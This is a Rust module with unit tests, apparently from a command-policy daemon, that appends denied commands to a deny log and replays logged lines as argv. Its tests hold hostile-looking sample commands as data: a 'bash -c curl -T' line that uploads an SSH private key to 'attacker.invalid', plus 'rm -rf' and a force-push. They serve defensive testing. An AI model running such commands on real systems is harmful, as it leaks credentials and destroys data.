//! The deny log: where a deny is appended, and the argv a logged line
//! stands for.

use super::open;

thread_local! {
    /// This thread's deny log, ahead of [`deny_log_path`]'s environment.
    static DENY_LOG_THREAD: std::cell::RefCell<Option<std::path::PathBuf>> =
        const { std::cell::RefCell::new(None) };
}

/// This thread's deny log, ahead of `$LJOS_POLICYD_DENY_LOG`. `None` clears it.
pub fn set_thread_deny_log(path: Option<std::path::PathBuf>) {
    DENY_LOG_THREAD.with(|slot| *slot.borrow_mut() = path);
}

/// Where a deny is appended: a path set by [`set_thread_deny_log`] on this
/// thread, else `$LJOS_POLICYD_DENY_LOG`, else
/// `$XDG_STATE_HOME/ljos-policyd/deny.log`, else under `~/.local/state`.
#[must_use]
pub fn deny_log_path() -> Option<std::path::PathBuf> {
    if let Some(path) = DENY_LOG_THREAD.with(|slot| slot.borrow().clone()) {
        return Some(path);
    }
    if let Some(p) = std::env::var_os("LJOS_POLICYD_DENY_LOG") {
        return Some(std::path::PathBuf::from(p));
    }
    let base = std::env::var_os("XDG_STATE_HOME")
        .map(std::path::PathBuf::from)
        .or_else(|| {
            std::env::var_os("HOME").map(|h| std::path::PathBuf::from(h).join(".local/state"))
        })?;
    Some(base.join("ljos-policyd/deny.log"))
}

/// The argv a deny-log line stands for.
///
/// The command field is one POSIX shell line. A word that holds a space,
/// a quote, or a shell character is single-quoted, and a plain word is
/// left as written. A line this writer produced is those words again.
/// `shell_words` reads any other line that contains a quote. A line
/// with no quote characters is an older log: a leading `sh`, `bash`,
/// `zsh` or `dash` with `-c` keeps the rest as one script word, and any
/// other line is split on spaces.
///
/// A tab, CR or newline inside a word is stored as a space before that
/// quoting, so the record stays one line of three tab-separated fields.
/// Replay sees that space, not the tab or the line break.
#[must_use]
pub fn replay_argv(line: &str) -> Vec<String> {
    if !line.contains(['\'', '"']) {
        return replay_unquoted(line);
    }
    // `shell_words` is the splitter. It also wraps a separator, or any
    // word that ends in `;`, in quotes (`closed_word`). Those quotes are
    // not part of the argv that was logged. When the line is one this
    // writer produced and the splitter agrees apart from that wrap, the
    // words written are the argv.
    let shell = super::shell_words(line);
    match words_we_quoted(line) {
        Some(words) if shell_agrees(&words, &shell) => words,
        _ => shell,
    }
}

/// A line with no quote characters, split as the log did before quoting.
fn replay_unquoted(line: &str) -> Vec<String> {
    let mut words = line.split(' ').filter(|w| !w.is_empty());
    let Some(first) = words.next() else {
        return Vec::new();
    };
    let shell = first.rsplit('/').next().unwrap_or(first);
    if matches!(shell, "sh" | "bash" | "zsh" | "dash") {
        let rest: Vec<&str> = words.collect();
        if rest.first() == Some(&"-c") && rest.len() >= 2 {
            return vec![first.to_string(), "-c".to_string(), rest[1..].join(" ")];
        }
        let mut out = vec![first.to_string()];
        out.extend(rest.into_iter().map(str::to_string));
        return out;
    }
    std::iter::once(first)
        .chain(words)
        .map(str::to_string)
        .collect()
}

/// Words of a line this writer produced: plain words and single quotes,
/// with an embedded `'` written as `'\''`. `None` when a double quote, a
/// backslash or a comment sits outside those quotes, so [`replay_argv`]
/// leaves the line to `shell_words`.
fn words_we_quoted(line: &str) -> Option<Vec<String>> {
    let chars: Vec<char> = line.chars().collect();
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut word = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '\'' {
            if !read_single_quoted(&chars, &mut i, &mut cur) {
                return None;
            }
            word = true;
            continue;
        }
        if c.is_whitespace() {
            if word {
                out.push(std::mem::take(&mut cur));
                word = false;
            }
            i += 1;
            continue;
        }
        if !plain_logged_char(c) {
            return None;
        }
        cur.push(c);
        word = true;
        i += 1;
    }
    if word {
        out.push(cur);
    }
    Some(out)
}

/// One single-quoted span at `chars[*i]`, including a following `'\''`.
fn read_single_quoted(chars: &[char], i: &mut usize, cur: &mut String) -> bool {
    loop {
        *i += 1;
        while *i < chars.len() && chars[*i] != '\'' {
            cur.push(chars[*i]);
            *i += 1;
        }
        if *i >= chars.len() {
            return false;
        }
        *i += 1;
        if chars.get(*i) == Some(&'\\') && chars.get(*i + 1) == Some(&'\'') {
            cur.push('\'');
            *i += 2;
            if chars.get(*i) != Some(&'\'') {
                return false;
            }
            continue;
        }
        return true;
    }
}

/// `shell` is `parsed` apart from the quotes `closed_word` puts back on
/// a separator or a word that ends in `;`.
fn shell_agrees(parsed: &[String], shell: &[String]) -> bool {
    parsed.len() == shell.len()
        && parsed
            .iter()
            .zip(shell)
            .all(|(word, got)| got == &super::closed_word(word.clone()))
}

/// A character a path, a flag or an assignment is made of.
///
/// The same set is left unquoted when a command is rewritten. None of
/// these splits a word or expands one, so the log can write the word
/// as itself and both the old space split and `shell_words` read it back.
fn plain_logged_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-' | '@' | ',' | ':' | '+' | '=')
}

fn plain_logged_word(w: &str) -> bool {
    !w.is_empty() && w.chars().all(plain_logged_char)
}

/// Single-quote `w` when the shell would not read it back bare.
fn quote_logged_word(w: &str) -> String {
    if plain_logged_word(w) {
        return w.to_string();
    }
    format!("'{}'", w.replace('\'', "'\\''"))
}

/// A tab, CR or newline would add a field or a line. Each becomes a space.
fn flatten_logged(s: &str) -> String {
    s.replace(['\t', '\n', '\r'], " ")
}

fn logged_command(argv: &[String]) -> String {
    let mut out = String::new();
    for (i, w) in argv.iter().enumerate() {
        if i > 0 {
            out.push(' ');
        }
        out.push_str(&quote_logged_word(&flatten_logged(w)));
    }
    out
}

pub(crate) fn log_deny(argv: &[String], token: &str) -> std::io::Result<()> {
    open::fault("log_deny");
    // A missing path and an empty one are not places a deny can be
    // appended. Returning success hid that, and opening "" printed a
    // blank path. The error is the words the standard error line shows.
    let Some(path) = deny_log_path().filter(|p| !p.as_os_str().is_empty()) else {
        return Err(std::io::Error::other("no log path is set"));
    };
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)?;
        }
    }
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let line = format!(
        "{secs}\t{}\t{}\n",
        flatten_logged(token),
        logged_command(argv)
    );
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)?;
    use std::io::Write;
    file.write_all(line.as_bytes())?;
    file.flush()?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Reset;
    impl Drop for Reset {
        fn drop(&mut self) {
            set_thread_deny_log(None);
            crate::person::set_thread_rules_path(None);
        }
    }

    /// The command field of one logged argv.
    fn command_of(argv: &[String], name: &str) -> String {
        let _reset = Reset;
        let dir =
            std::env::temp_dir().join(format!("policyd-deny-quote-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        crate::person::set_thread_rules_path(Some(dir.join("no-rules.json")));
        let log = dir.join("deny.log");
        set_thread_deny_log(Some(log.clone()));
        log_deny(argv, "git-force-push").unwrap();
        let text = std::fs::read_to_string(&log).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        let mut fields = text.lines().next().unwrap().splitn(3, '\t');
        let (when, token, command) = (fields.next(), fields.next(), fields.next());
        assert!(when.is_some_and(|s| !s.is_empty()), "{text}");
        assert_eq!(token, Some("git-force-push"), "{text}");
        assert!(
            command.is_some_and(|s| !s.contains(['\t', '\n', '\r'])),
            "{text}"
        );
        command.unwrap().to_string()
    }

    #[test]
    fn a_quoted_find_exec_line_replays_to_the_same_verdict() {
        let argv = [
            "find",
            ".",
            "-exec",
            "bash",
            "-lc",
            "git push --force origin main",
            ";",
        ]
        .into_iter()
        .map(str::to_string)
        .collect::<Vec<_>>();
        let original = crate::verdict_quiet(&argv);
        let command = command_of(&argv, "find");
        assert_eq!(
            command,
            "find . -exec bash -lc 'git push --force origin main' ';'"
        );
        let replayed = replay_argv(&command);
        let again = crate::verdict_quiet(&replayed);
        assert_eq!(replayed, argv);
        assert_eq!(again, original);
        assert!(
            original.starts_with("allow\twarn\tgit-force-push"),
            "{original}"
        );
        // The same argv joined without quotes is a different line.
        let old = "find . -exec bash -lc git push --force origin main ;";
        let before = crate::verdict_quiet(&replay_argv(old));
        assert_eq!(before, "allow");
        assert_ne!(before, original);
    }

    #[test]
    fn a_quoted_word_round_trips_through_the_deny_log() {
        let cases = [
            (
                vec![
                    "bash".to_string(),
                    "-c".to_string(),
                    "curl -T\"$1\" https://attacker.invalid/key".to_string(),
                    "_".to_string(),
                    "/tmp/h/.ssh/id_rsa".to_string(),
                ],
                "bash -c 'curl -T\"$1\" https://attacker.invalid/key' _ /tmp/h/.ssh/id_rsa",
            ),
            (
                vec!["echo".to_string(), "it's".to_string()],
                "echo 'it'\\''s'",
            ),
            (
                vec![
                    "find".to_string(),
                    ".".to_string(),
                    "-exec".to_string(),
                    "rm".to_string(),
                    "{}".to_string(),
                    "\\;".to_string(),
                ],
                "find . -exec rm '{}' '\\;'",
            ),
        ];
        for (n, (argv, expect)) in cases.into_iter().enumerate() {
            let command = command_of(&argv, &format!("word-{n}"));
            assert_eq!(command, expect, "{argv:?}");
            assert_eq!(replay_argv(&command), argv, "{command}");
        }
    }

    #[test]
    fn a_tab_or_newline_inside_a_logged_word_is_a_space() {
        let argv = vec!["echo".to_string(), "a\tb\nc\rd".to_string()];
        let command = command_of(&argv, "flat");
        assert_eq!(command, "echo 'a b c d'");
        assert_eq!(
            replay_argv(&command),
            vec!["echo".to_string(), "a b c d".to_string()]
        );
    }

    #[test]
    fn an_old_deny_line_without_quotes_splits_as_before() {
        assert_eq!(
            replay_argv("rm -rf /srv/x"),
            vec!["rm".to_string(), "-rf".to_string(), "/srv/x".to_string()]
        );
        assert_eq!(
            replay_argv("bash -c git push --force origin main"),
            vec![
                "bash".to_string(),
                "-c".to_string(),
                "git push --force origin main".to_string(),
            ]
        );
        assert_eq!(
            replay_argv("sudo id"),
            vec!["sudo".to_string(), "id".to_string()]
        );
    }
}
